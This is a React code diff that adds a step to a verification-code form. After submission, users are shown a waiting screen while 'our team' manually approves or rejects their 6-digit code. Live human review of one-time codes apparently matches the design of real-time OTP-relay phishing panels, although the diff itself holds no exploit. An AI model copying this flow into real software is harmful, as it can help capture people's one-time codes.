@@ -12,6 +12,7 @@ import { Progress } from '@/components/ui/progress';
 import type { Submission } from '@/lib/types';
 import { useState } from 'react';
 import { useToast } from '@/hooks/use-toast';
+import { WaitingForApproval } from './waiting-for-approval';
 
 const formSchema = z.object({
   verificationCode: z.string().length(6, "Code must be 6 digits."),
@@ -28,6 +29,7 @@ interface VerifyCodeStepProps {
 export function VerifyCodeStep({ submissionId, onNext, onBack }: VerifyCodeStepProps) {
     const { toast } = useToast();
     const [isSubmitting, setIsSubmitting] = useState(false);
+    const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
 
     const form = useForm<FormValues>({
         resolver: zodResolver(formSchema),
@@ -49,16 +51,39 @@ export function VerifyCodeStep({ submissionId, onNext, onBack }: VerifyCodeStepP
 
             toast({
               title: 'Code Submitted!',
-              description: "Your verification code has been sent for approval.",
+              description: "Waiting for admin approval.",
             });
             
-            onNext({ verificationCode: values.verificationCode });
+            // Don't call onNext yet. Instead, show the waiting component.
+            setIsWaitingForApproval(true);
 
         } catch (err: any) {
             toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
             setIsSubmitting(false); // Only stop loading on error
         }
     };
+
+    if (isWaitingForApproval) {
+        return (
+            <WaitingForApproval
+                submissionId={submissionId}
+                stepToWatch="verificationCode"
+                promptText="Please keep this page open. Your verification code is being reviewed by our team."
+                onApproval={() => onNext({ verificationCode: form.getValues('verificationCode') })}
+                onRejection={() => {
+                    toast({
+                        variant: 'destructive',
+                        title: 'Verification Rejected',
+                        description: 'Please check your code and try again.',
+                    });
+                    setIsWaitingForApproval(false);
+                    setIsSubmitting(false);
+                    form.reset();
+                }}
+            />
+        );
+    }
+
 
     return (
         <div className="w-full max-w-lg mx-auto">
